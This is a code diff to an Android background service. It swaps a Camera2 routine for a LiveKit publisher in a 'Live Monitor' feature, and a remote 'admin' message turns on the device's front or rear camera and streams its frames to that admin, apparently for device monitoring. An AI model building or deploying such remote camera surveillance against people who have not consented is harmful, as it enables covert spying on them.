@@ -94,6 +94,9 @@ public class KeepAliveService extends Service {
     private static final int     SCREEN_CAPTURE_INTERVAL_MS = 5000; // 5 sec
 
     // ── Live Monitor fields ───────────────────────────────────────────────────
+    private LiveKitManager       lkManager;     // LiveKit camera publisher
+
+    // Camera2 fields kept for cleanup safety (no longer used for streaming)
     private CameraDevice         cameraDevice;
     private CameraCaptureSession captureSession;
     private ImageReader          imageReader;
@@ -123,6 +126,7 @@ public class KeepAliveService extends Service {
             .connectTimeout(30, TimeUnit.SECONDS)
             .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
             .build();
+        lkManager = new LiveKitManager(this, httpClient);
         createChannel();
         // Only include FGS types for permissions already granted — Android 14+ crashes if type
         // is declared but the matching runtime permission hasn't been granted yet.
@@ -562,87 +566,20 @@ public class KeepAliveService extends Service {
         try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
     }
 
-    // ── Live Monitor — Camera2 ────────────────────────────────────────────────
+    // ── Live Monitor — LiveKit camera publisher ───────────────────────────────
 
     private void handleStartCamera(JSONObject msg) {
-        if (cameraStreaming) return;
-        fromAdminIdCamera = msg.optString("fromAdminId");
-        cameraStreaming = true;
-
-        cameraThread = new HandlerThread("cam-capture");
-        cameraThread.start();
-        cameraHandler = new Handler(cameraThread.getLooper());
-
-        try {
-            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-            String camId = null;
-            for (String id : cm.getCameraIdList()) {
-                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
-                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
-                String wantFacing = msg.optString("facing", "rear");
-                boolean wantFront = "front".equals(wantFacing);
-                int targetFacing = wantFront
-                    ? CameraCharacteristics.LENS_FACING_FRONT
-                    : CameraCharacteristics.LENS_FACING_BACK;
-                if (facing != null && facing == targetFacing) {
-                    camId = id; break;
-                }
-            }
-            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
-            if (camId == null) { cameraStreaming = false; return; }
-
-            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
-            imageReader.setOnImageAvailableListener(reader -> {
-                try (Image image = reader.acquireLatestImage()) {
-                    if (image == null || !cameraStreaming || nativeWs == null) return;
-                    ByteBuffer buf = image.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buf.remaining()];
-                    buf.get(bytes);
-                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                    JSONObject frame = new JSONObject();
-                    frame.put("type", "camera_frame");
-                    frame.put("forAdminId", fromAdminIdCamera);
-                    frame.put("data", b64);
-                    frame.put("ts", System.currentTimeMillis());
-                    nativeWs.send(frame.toString());
-                } catch (Exception ignored) {}
-            }, cameraHandler);
-
-            final String finalCamId = camId;
-            cm.openCamera(finalCamId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(@NonNull CameraDevice device) {
-                    cameraDevice = device;
-                    try {
-                        List<android.view.Surface> surfaces =
-                            Collections.singletonList(imageReader.getSurface());
-                        device.createCaptureSession(surfaces,
-                            new CameraCaptureSession.StateCallback() {
-                                @Override
-                                public void onConfigured(@NonNull CameraCaptureSession session) {
-                                    captureSession = session;
-                                    try {
-                                        CaptureRequest.Builder b =
-                                            device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-                                        b.addTarget(imageReader.getSurface());
-                                        session.setRepeatingRequest(b.build(), null, cameraHandler);
-                                    } catch (Exception e) { handleStopCamera(); }
-                                }
-                                @Override
-                                public void onConfigureFailed(@NonNull CameraCaptureSession s) {
-                                    handleStopCamera();
-                                }
-                            }, cameraHandler);
-                    } catch (Exception e) { handleStopCamera(); }
-                }
-                @Override public void onDisconnected(@NonNull CameraDevice d) { handleStopCamera(); }
-                @Override public void onError(@NonNull CameraDevice d, int e) { handleStopCamera(); }
-            }, cameraHandler);
-
-        } catch (Exception e) { cameraStreaming = false; }
+        String facing = msg.optString("facing", "rear");
+        String httpBase = serverUrl
+            .replaceFirst("^wss://", "https://")
+            .replaceFirst("^ws://", "http://")
+            .replaceFirst("/ws$", "");
+        lkManager.startCamera(httpBase, userId != null ? userId : "", facing);
     }
 
     private void handleStopCamera() {
+        lkManager.stopCamera();
+        // Clean up any leftover Camera2 state (safety)
         cameraStreaming = false;
         try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
         try { if (cameraDevice  != null) { cameraDevice.close();   cameraDevice  = null; } } catch (Exception ignored) {}
